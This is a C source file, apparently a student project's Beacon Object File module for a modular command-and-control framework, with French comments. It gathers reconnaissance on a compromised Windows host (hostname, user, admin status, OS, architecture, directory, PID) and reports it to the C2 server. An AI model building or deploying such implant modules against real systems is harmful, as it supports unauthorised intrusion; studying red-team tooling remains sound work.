/*
 * ============================================================
 *  modules/bof/mod_sysinfo.c — Module sysinfo au format BOF
 *
 *  Collecte les informations système et les envoie au serveur
 *  via BeaconPrintf. Format de sortie identique au module built-in.
 *
 *  Compilation BOF (depuis MSYS2/MinGW64) :
 *    x86_64-w64-mingw32-gcc -c -DBOF_MODE -o sysinfo.x64.o mod_sysinfo.c
 *    i686-w64-mingw32-gcc   -c -DBOF_MODE -o sysinfo.x86.o mod_sysinfo.c
 *
 *  Déploiement :
 *    Copier les .o dans server/modules/sysinfo/
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "beacon.h"

/* ── Déclarations Windows API (BOF mode uniquement) ──────────
 * En RDLL mode, windows.h fournit déjà ces déclarations.     */
#ifndef RDLL_MODE
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GetUserNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT WINBASEAPI DWORD  WINAPI KERNEL32$GetCurrentDirectoryA(DWORD, LPSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$IsWow64Process(HANDLE, PBOOL);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT WINBASEAPI void   WINAPI KERNEL32$GetNativeSystemInfo(LPSYSTEM_INFO);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GetVersionExA(LPOSVERSIONINFOA);
#endif /* !RDLL_MODE */

#ifndef RDLL_MODE
/* En RDLL mode, ces types viennent de <windows.h> via beacon.h */
typedef struct { WORD wProcessorArchitecture; WORD wReserved; DWORD dwPageSize;
    void* lpMinimumApplicationAddress; void* lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask; DWORD dwNumberOfProcessors;
    DWORD dwProcessorType; DWORD dwAllocationGranularity;
    WORD wProcessorLevel; WORD wProcessorRevision; } _SYSTEM_INFO;

typedef struct { DWORD dwOSVersionInfoSize; DWORD dwMajorVersion; DWORD dwMinorVersion;
    DWORD dwBuildNumber; DWORD dwPlatformId; CHAR szCSDVersion[128]; } _OSVERSIONINFOA;
#endif /* !RDLL_MODE */


/* ── Fonction d'entrée BOF ────────────────────────────────── */

void go(char *args, int args_len) {
    (void)args; (void)args_len;  /* sysinfo ne prend pas d'arguments */

    char hostname[256] = "?";
    char username[256] = "?";
    char cwd[512]      = "?";
    char arch[16]      = "x86_64";
    DWORD sz;

    /* Nom de la machine */
    sz = sizeof(hostname);
    KERNEL32$GetComputerNameA(hostname, &sz);

    /* Nom de l'utilisateur */
    sz = sizeof(username);
    KERNEL32$GetUserNameA(username, &sz);

    /* Répertoire courant */
    KERNEL32$GetCurrentDirectoryA(sizeof(cwd), cwd);

    /* Architecture */
    _SYSTEM_INFO si;
    KERNEL32$GetNativeSystemInfo((_SYSTEM_INFO*)&si);
    switch (si.wProcessorArchitecture) {
        case 9:  /* PROCESSOR_ARCHITECTURE_AMD64 */
            BeaconPrintf(CALLBACK_OUTPUT, ""); /* évite warning unused */
            break;
        case 0:  /* x86 */
            __builtin_memcpy(arch, "x86", 4);
            break;
        case 12: /* ARM64 */
            __builtin_memcpy(arch, "arm64", 6);
            break;
    }

    /* Vérification WoW64 (process 32 bits sur OS 64 bits) */
    BOOL is_wow64 = FALSE;
    KERNEL32$IsWow64Process(KERNEL32$GetCurrentProcess(), &is_wow64);
    if (is_wow64) __builtin_memcpy(arch, "x86 (WoW64)", 12);

    /* Version OS */
    _OSVERSIONINFOA osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    KERNEL32$GetVersionExA((_OSVERSIONINFOA*)&osvi);

    /* Privilèges */
    const char *priv = BeaconIsAdmin() ? "ADMIN" : "User";

    /* Construction du rapport de sortie */
    BeaconPrintf(CALLBACK_OUTPUT,
        "Hostname   : %s\n"
        "Username   : %s (%s)\n"
        "OS         : Windows %lu.%lu (Build %lu)\n"
        "Arch       : %s\n"
        "CWD        : %s\n"
        "PID        : %lu\n",
        hostname,
        username, priv,
        (unsigned long)osvi.dwMajorVersion,
        (unsigned long)osvi.dwMinorVersion,
        (unsigned long)osvi.dwBuildNumber,
        arch,
        cwd,
        (unsigned long)KERNEL32$GetCurrentProcessId()
    );
}
